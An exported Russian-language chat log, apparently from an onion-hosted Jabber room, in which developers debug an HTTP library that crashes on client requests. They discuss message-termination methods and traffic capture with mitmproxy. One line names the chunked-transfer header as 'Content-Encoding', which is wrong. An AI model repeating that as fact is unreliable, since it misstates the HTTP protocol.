Timestamp	From	To	Message
2021-08-27 10:23:21.385745	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:24:45.407839	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:28:23.148995	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:29:07.638292	hof	ttrr	1
2021-08-27 10:29:07.639930	ttrr	hof	1
2021-08-27 10:30:05.419498	ttrr	hof	тута
2021-08-27 10:30:05.420470	ttrr	hof	ждем остальных
2021-08-27 10:30:05.421669	ttrr	hof	ок
2021-08-27 10:30:05.421979	ttrr	hof	хай
2021-08-27 10:30:05.422456	ttrr	hof	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:30:05.422835	ttrr	hof	это только для зарегистрированных участников
2021-08-27 10:30:05.423642	ttrr	hof	других тут не может быть
2021-08-27 10:30:05.424482	ttrr	hof	хоф остался
2021-08-27 10:30:23.082673	hof	ttrr	на месте
2021-08-27 10:30:23.083909	ttrr	hof	на месте
2021-08-27 10:30:28.879939	hof	ttrr	привет
2021-08-27 10:30:28.882112	ttrr	hof	привет
2021-08-27 10:34:32.662723	ttrr	hof	короче . проблема в хттп в том . что клиент обрывает коннект раньше, чем передает данные . а именно я грешу на то, что клиент не передает самый последний перевод строки
2021-08-27 10:35:13.162821	ttrr	hof	от этого возникает краш на моей стороне и я не могу обработать запрос
2021-08-27 10:35:33.428385	ttrr	hof	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:41.727352	ttrr	hof	1. Content-Length
2021-08-27 10:35:47.131927	ttrr	hof	2. Connection: close
2021-08-27 10:36:04.114354	ttrr	hof	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:15.503921	ttrr	hof	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:21.266853	ttrr	hof	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:59.319197	ttrr	hof	defender добавь сюда flip и steller
2021-08-27 10:37:09.757237	ttrr	hof	да  я никакой не форсирую .есть либа . которая занимается хтпп .. она парсит и разбирает всё .. я лишь её вызываю . 
причем сделано это так .. что сначала работает она .. а потом уже я .. т.о. я не имею доступа напрямую к бинарному потоку данных
2021-08-27 10:37:22.169139	ttrr	hof	так вот разберись
2021-08-27 10:37:36.835002	ttrr	hof	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:55.061608	ttrr	hof	причина есть .если эта причина удовлетворяет спеицификациям хттп ..
2021-08-27 10:37:55.378717	ttrr	hof	например им сложно использовать chunked-передачу
2021-08-27 10:38:34.866927	ttrr	hof	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:38.661253	ttrr	hof	если либа падает - это значит что клиент отправляет не то что ожидает эта либа . т.е. не хттп
2021-08-27 10:39:02.449365	ttrr	hof	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:06.113076	ttrr	hof	либа ожидает на входе (бинарном) данные, но бинарный вход пуст .. вот парсер хттп и ломается
2021-08-27 10:39:17.551078	ttrr	hof	она умеет всё
2021-08-27 10:39:26.514531	ttrr	hof	как видим не всё
2021-08-27 10:39:29.431105	ttrr	hof	это промышленное решение .. и её пользуются очень многие
2021-08-27 10:39:40.117749	ttrr	hof	давай на примерах
2021-08-27 10:39:46.365048	ttrr	hof	примерах что ?
2021-08-27 10:39:51.190207	ttrr	hof	кривой посылки
2021-08-27 10:40:03.665991	ttrr	hof	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:15.079052	ttrr	hof	еще раз . у меня нет доступа к бинарному потоку ..
2021-08-27 10:40:19.334459	ttrr	hof	либа от меня это скрывает
2021-08-27 10:40:31.498976	ttrr	hof	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:39.271374	ttrr	hof	я лишь могу по ошибке сказать где сломалось у неё и я вижу что она ожидает данные - но данных нет
2021-08-27 10:40:52.889332	ttrr	hof	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:58.710534	ttrr	hof	нет
2021-08-27 10:41:03.476358	ttrr	hof	только через прокси какой могу
2021-08-27 10:41:07.275655	ttrr	hof	поставь mitmproxy
2021-08-27 10:41:18.241415	ttrr	hof	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.452648	ttrr	hof	ну или логи сделать внутри либы
2021-08-27 10:41:22.816112	ttrr	hof	это уже по живому надо
2021-08-27 10:41:51.573767	ttrr	hof	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:42:05.075423	ttrr	hof	в общем давай я посмотрю тогда бинарный поток . лог сделаю на живом сервере ..
2021-08-27 10:42:05.582691	ttrr	hof	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:08.861359	hof	ttrr	может убрать либу? получать данные с сокета?
2021-08-27 10:42:08.864968	ttrr	hof	может убрать либу? получать данные с сокета?
2021-08-27 10:42:10.027980	ttrr	hof	они тоже могут дать пример потока
2021-08-27 10:42:18.328863	ttrr	hof	парсить хттп сам будешь ?
2021-08-27 10:42:39.089513	ttrr	hof	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:43.639580	ttrr	hof	мне щас надо на часок отлучится .. приду - сделаю - посмотрю
2021-08-27 10:42:44.193723	ttrr	hof	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.436975	hof	ttrr	ну а какой выход?
2021-08-27 10:42:44.439347	ttrr	hof	ну а какой выход?
